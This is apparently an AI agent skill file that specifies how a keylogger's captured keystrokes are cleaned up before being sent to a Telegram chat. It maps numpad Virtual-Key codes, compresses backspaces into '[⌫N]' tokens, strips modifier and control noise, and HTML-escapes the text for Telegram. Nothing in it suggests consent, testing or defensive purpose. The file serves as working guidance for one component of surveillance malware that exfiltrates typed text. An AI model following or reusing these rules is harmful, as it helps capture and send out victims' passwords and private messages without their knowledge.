---
name: keylog-sanitizer
description: Keylogger filtering guidelines for mapping Virtual-Key codes (numpad digits 96-105, operators), filtering noise tokens, compressing consecutive backspaces [⌫N], and escaping HTML for Telegram.
---

# Keylog Sanitizer Skill

This skill defines rules and normalization rules for capturing, filtering, and formatting raw keypresses before sending to Telegram.

## Sanitization Rules

1. **Virtual Key Codes (`^<\d+>$`)**:
   - Numpad Digits (`VK 96-105`) -> map to `'0'` through `'9'`.
   - Numpad Operators:
     - `110` -> `.`
     - `107` -> `+`
     - `109` -> `-`
     - `106` -> `*`
     - `111` -> `/`
   - All other unmapped `<vk>` tokens must be ignored.

2. **Backspace Formatting & Compression**:
   - Map `Key.backspace` to `"[⌫]"`.
   - In `process_keylog_text()`, compress consecutive backspace tokens into `"[⌫N]"` (e.g., `[⌫][⌫][⌫][⌫]` -> `[⌫4]`).

3. **Noise Token Removal**:
   - Remove control characters (`ord(ch) < 32` except `\n`, `\r`, `\t`).
   - Remove noise tokens: `esc`, `caps_lock`, `right_shift`, `left_shift`, `right_alt`, `left_alt`, `ctrlc`, `ctrlv`, `ctrlz`, `alttab`, `print_screen`, `left_windows`, `end`, `delete`, `ctrl`.

4. **HTML Entity Safety**:
   - Escape HTML special characters (`html.escape()`) to prevent Telegram parse errors.
